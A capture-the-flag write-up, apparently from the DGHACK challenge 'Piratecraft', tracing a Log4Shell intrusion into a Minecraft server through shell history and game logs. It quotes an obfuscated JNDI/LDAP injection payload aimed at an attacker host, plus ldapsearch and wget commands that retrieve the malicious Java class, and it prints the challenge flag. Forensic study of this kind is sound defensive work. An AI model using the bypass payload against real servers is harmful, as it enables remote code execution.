# Detection  / Piratecraft

## Challenge
Un service d'hébergement de serveurs de jeux fournit des VPS avec Minecraft préinstallé pour leurs clients. Certaines attaques ciblent les serveurs et les font tomber en panne. Vous êtes le nouvel administrateur système. Vous avez accès à un serveur attaqué. Détectez l'intrusion sur le serveur Minecraft et essayez de comprendre les actions malveillantes.


## Solution
ssh onto the server as root using the provided credentials:

```console
$ ssh root@ssh-piratecraft-server-azjcbp.inst.malicecyber.com  -p 4106 -o ServerAliveInterval=30 -o ServerAliveCountMax=2
```

We find an interesting indication in the the `Minecraft` server start script: the attacker added `echo "Hacked by unhappy.competitor.com"` to the script:

```console
root@malice:/home/app# cat .bash_history
whoami
mkdir /home/craft
cd /home/craft/
ls -lthar
apt-get update -y
apt-get install -y openjdk-17-jdk openjdk-17-jre git zip screen wget nano openssh-server php7.4
https://launcher.mojang.com/v1/objects/0a269b5f2c5b93b1712d0f5dc43b6182b9ab254e/server.jar
mv server.jar minecraft_server.jar
nano /home/craft/start.sh
chmod -R 775 /home/craft/
screen -ls
/home/craft/start.sh minecraft "java -Xmx1024M -Xms1024M -jar /home/craft/minecraft_server.jar nogui &"
screen -R minecraft
cat /var/log/minecraft.log
ls -lthar
pwd
whoami
netstat -lentupac
rm minecraft_server.jar
echo "Hacked by unhappy.competitor.com"
```

Looking into the Minecraft logs in `/var/log/minecraft.log`, we see weird command injection from user `unhappy`:
```console
root@malice:/var/log# grep -i unhappy minecraft.log
[16:39:32] [User Authenticator #10639/INFO]: UUID of player unhappy is a00b999e-001b-4807-b999-add902b9999c
[16:39:32] [Server thread/INFO]: unhappy[/172.240.18.1:57008] logged in with entity id 10991 at (-257.5, 67.0, -198.5)
[16:39:32] [Server thread/INFO]: unhappy joined the game
[16:39:33] [Server thread/INFO]: <unhappy> ${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//unhappy.competitor.com:1389/a}
[16:39:33] [Server thread/INFO]: <unhappy> Reference Class Name: foo
[16:40:02] [Server thread/INFO]: unhappy lost connection: Disconnected
[16:40:02] [Server thread/INFO]: unhappy left the game
```

Sounds like the infamous `Log4j`!

The attacker used some bypass technique, but the payload is essentially `${jndi:ldap:unhappy.competitor.com:1389/a}`

Looking into the logs for `LDAP` commands:
```console
root@malice:/var/log# grep -rain ldap
(pr(P0H0@8`H8` 8\rSYSLOG_IDENTIFIER=ldapsearchazCSYSLOG_TIMESTAMP=May 10 11:43:48 c+A*ЬMESSAGE=DIGEST-MD5 common mech freeH7[j63a_PID=533PS$,>!Xa_COMM=ldapsearchXN/
                                                                                                                                                                    x_EXE=/usr/bin/ldapsearchʯa_CMDLINE=ldapsearch -x -H ldap://174.10.54.15:1389/Exploit.classPSLDF+bpt_AUDIT_SESSION=1xW9ct_SYSTEMD_CGROUP=/user.slice/user-0.slice/session-1.scopeR`R
(...)
```

So we see this `LDAP` command: `ldapsearch -x -H ldap://174.10.54.15:1389/Exploit.class`

Let's run it and see where it sends us:
```console
root@malice:/var/log# ldapsearch -x -H ldap://174.10.54.15:1389/Exploit.class
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
javaClassName: foo
javaCodeBase: http://174.10.54.15:50666/
objectClass: javaNamingReference
javaFactory: Exploit84686564564857543

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

The location of the malicious Java class can be deduced from `javaCodeBase` and `javaFactory`. Let's fetch it:
```console
root@malice:~# wget http://174.10.54.15:50666/Exploit84686564564857543.class
--2022-11-12 15:02:13--  http://174.10.54.15:50666/Exploit84686564564857543.class
Connecting to 174.10.54.15:50666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5067 (4.9K) [application/java-vm]
Saving to: 'Exploit84686564564857543.class'

Exploit84686564564857543.cla 100%[==============================================>]   4.95K  --.-KB/s    in 0s

2022-11-12 15:02:13 (155 MB/s) - 'Exploit84686564564857543.class' saved [5067/5067]
```

This is compiled Java class. Decompile it Using `jadx` locally on our box:
```console
$ file Exploit84686564564857543.class 
Exploit84686564564857543.class: compiled Java class data, version 52.0 (Java 1.8)

$jadx -d out Exploit84686564564857543.class                                                                   
INFO  - loading ...                                                                                                   
INFO  - processing ...                                                                                                
INFO  - done  

$ find out
out
out/sources
out/sources/defpackage
out/sources/defpackage/Exploit.java
```

At last we get the `Exploit.java` source code: [Exploit.java](./Exploit.java).

After some cleanup (remove the stuff with the TCP socket), we get our modified `ModifExploit.java`. After compilation and execution:
```console
$ javac ModifExploit.java
$ java ModifExploit
###########################################
# - - - - -  WELCOME IN SHELL - - - - - - #
# - - ALL YOUR CUBES ARE BELONG TO US - - #
# -- $Hacked_by_unhappy.competitor.com -- #
# DGHACK{411_Y0Ur_CU835_4r3_8310N6_70_U5} #
###########################################
```

## Flag
DGHACK{411_Y0Ur_CU835_4r3_8310N6_70_U5}

